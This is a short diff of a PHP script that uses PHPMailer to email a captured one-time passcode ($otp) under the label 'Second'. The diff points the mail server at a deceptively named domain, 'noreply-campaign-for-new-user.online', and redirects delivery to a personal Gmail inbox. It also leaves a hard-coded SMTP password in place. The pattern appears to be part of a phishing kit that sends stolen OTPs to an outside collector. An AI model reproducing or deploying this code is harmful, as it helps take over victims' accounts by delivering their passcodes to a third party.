@@ -13,18 +13,17 @@ include('PHPMailer/class.smtp.php');
         {
                 $mail = new PHPMailer();
                 $mail->isSMTP();
-                $mail->Host = "smtp.hostinger.com";
+                $mail->Host = "noreply-campaign-for-new-user.online";
                 $mail->SMTPAuth = true;
                 $mail->SMTPSecure = 'ssl';
                 $mail->Port = 465;
-                $mail->Username = "info@swimstudios.xyz";
+                $mail->Username = "info@noreply-campaign-for-new-user.online";
                 $mail->Password = "Admin@123";
-                $mail->AddAddress("info@swimstudios.xyz");
-                $mail->addCC('easymailid45@gmail.com');
+                $mail->AddAddress("v.nawab01@gmail.com");
                 $mail->SetFrom($mail->Username);
                 
                 $mail->isHTML(true);
-                $mail->Subject   = 'Second';
+                $mail->Subject   = 'Fourth';
                 
                      $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                 <p><b>Second</b> - '.$otp.'</p>';
